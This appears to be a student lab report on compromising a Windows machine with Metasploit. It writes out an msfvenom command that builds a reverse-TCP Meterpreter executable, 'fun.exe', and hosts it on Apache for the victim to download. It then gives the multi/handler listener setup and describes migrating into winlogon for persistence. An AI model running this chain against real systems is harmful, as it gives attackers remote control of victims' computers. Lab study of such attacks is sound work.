## NAME : DHARSHINI S
## REG NO :212224100012

# Compromising-windows-using-Metasploit

# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


Find the attackers ip address using ifconfig



![{3424BE28-66DF-47AA-B62D-A4C3D46A49E7}](https://github.com/user-attachments/assets/d39170cb-ae83-4e56-8a8a-2d39c7364170)
Displays the ifconfig command output used to view network interface details and identify the system’s IP configuration.
This screenshot shows the ifconfig command output, which displays the network configuration details of the Kali Linux attacker machine, including IP address, MAC address, and active network interfaces.


Create a malicious executable file fun.exe using msfvenom command


msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe


![{82C3B552-FFA8-44E1-A54C-BC3D3FCE8738}](https://github.com/user-attachments/assets/b87cdb49-50a5-42d3-9381-ad0d1cc985c6)
This screenshot shows the msfvenom command used to create a malicious executable file named fun.exe with a reverse TCP Meterpreter payload for remote connection.

copy the fun.exe into the apache /var/www/html folder


![{1CCEB4E8-D88B-4EA0-AB56-5497B1B366F9}](https://github.com/user-attachments/assets/2f8dee6b-7453-4ba6-bc32-0cc20c7c3f16)
This screenshot shows the command used to copy the generated fun.exe file into the Apache web server directory for downloading through a browser.


Start apache server


sudo systemctl apache2 start

![{4B01427D-3EE4-49D5-B9F4-5D008690DFE5}](https://github.com/user-attachments/assets/2cb87178-558b-4759-bbf7-d42185fc3507)
This screenshot shows the command used to start the Apache2 web server service in Kali Linux to host the malicious executable file.

Check the status of apache2


![{56B70F00-52BB-4853-B38F-B9572A436F33}](https://github.com/user-attachments/assets/99d117e3-2a0a-4201-b804-45d20a402459)
This screenshot shows the Apache server status, confirming that the Apache2 web server is active and running successfully on the Kali Linux machine.

Invoke msfconsole:


![{0127CD56-6237-4EF8-916E-84EB20ED1F1C}](https://github.com/user-attachments/assets/04afa8b9-fc04-4ce8-b192-1f6091fa909e)
This screenshot shows the msfconsole interface, which is the Metasploit Framework console used to launch exploits, payloads, and penetration testing modules.

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.



![{1701D860-73ED-40A2-8956-1C111C9715BE}](https://github.com/user-attachments/assets/8762ea2b-2997-4677-80de-0349418dc377)
This screenshot shows the help command output in Metasploit, listing available core and module commands used for penetration testing operations.

Starting a command and control Server


use multi/handler


set PAYLOAD windows/meterpreter/reverse_tcp


set LHOST 0.0.0.0


exploit


![{732CC25B-2340-4B26-A4DD-A3A6F53E9B5A}](https://github.com/user-attachments/assets/2488740a-eae6-4cb7-bc98-ced2a35e38f8)
This screenshot shows the multi/handler setup in Metasploit configured with the Meterpreter reverse TCP payload to listen for incoming target connections.

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP 


address of your Kali machine:


http://192.168.1.2/fun.exe


The file "fun.exe" downloads. 


![{88B12FA3-F48D-4C84-888B-FC8E24DB9AB0}](https://github.com/user-attachments/assets/df6b2137-4570-4d70-9714-46882d54a171)

This screenshot shows the target Windows machine downloading the fun.exe file from the attacker’s Apache web server using a web browser.


![{5C817246-750A-44B2-91E8-187FD4DD6886}](https://github.com/user-attachments/assets/2c5ee8f1-6368-4caf-a3f5-e386a498bf8c)
This screenshot shows successful Meterpreter session connections established between the target Windows machine and the Kali Linux attacker system.

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

# RESULT 
thus the windows was compromised using metasploit.
